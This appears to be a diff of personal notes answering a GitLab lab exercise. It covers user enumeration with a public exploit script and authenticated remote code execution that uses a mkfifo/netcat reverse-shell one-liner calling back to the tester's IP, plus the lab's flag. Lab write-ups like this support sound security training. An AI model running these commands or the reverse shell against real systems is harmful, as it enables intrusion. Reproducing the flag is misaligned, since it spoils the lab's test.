@@ -1,1 +1,14 @@
+Question 1 - Find another valid user on the target GitLab instance.
 
+1) searchsploit -m ruby/webapps/49821.sh
+2) ./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/SecLists/Usernames/cirt-default-usernames.txt | grep exists 
+3) output: [+] The username DEMO exists!
+
+
+Question 2 - Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in. - s3cure_y0ur_Rep0s! 
+1) searchsploit -m ruby/webapps/49951.py
+2) set up nc listener on kali box - nc -nlvp 4444
+3) python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u HTBAcademy -p password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.252 4444 >/tmp/f'
+4) git@app04:~/gitlab-workhorse$ cat flag_gitlab.txt
+
+s3cure_y0ur_Rep0s!
